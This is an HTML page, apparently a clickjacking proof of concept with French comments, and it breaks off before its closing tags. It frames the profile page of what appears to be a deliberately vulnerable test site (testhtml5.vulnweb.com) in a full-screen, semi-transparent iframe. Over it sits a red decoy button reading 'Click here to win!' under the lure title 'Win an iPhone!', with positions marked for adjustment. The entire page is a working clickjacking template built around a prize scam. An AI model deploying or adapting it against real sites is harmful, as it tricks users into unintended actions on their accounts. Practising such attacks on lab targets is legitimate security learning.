<!DOCTYPE html>
<html>
<head>
    <title>Gagne un iPhone !</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
        
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.3; /* Semi-transparent pour le test */
            z-index: 1;
            border: none;
        }
        .fake-button {
            position: absolute;
            top: 300px; /* À ajuster */
            left: 400px; /* À ajuster */
            width: 150px; /* À ajuster */
            height: 40px; /* À ajuster */
            z-index: 2;
            background-color: red;
            color: white;
            padding: 0; /* Retirer le padding si nécessaire */
            font-size: 16px;
            font-weight: bold;
            text-align: center;
            line-height: 40px; /* Centrer verticalement */
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <iframe src="http://testhtml5.vulnweb.com/#/profile"></iframe>
    <div class="fake-button">Clique ici pour gagner !</div>
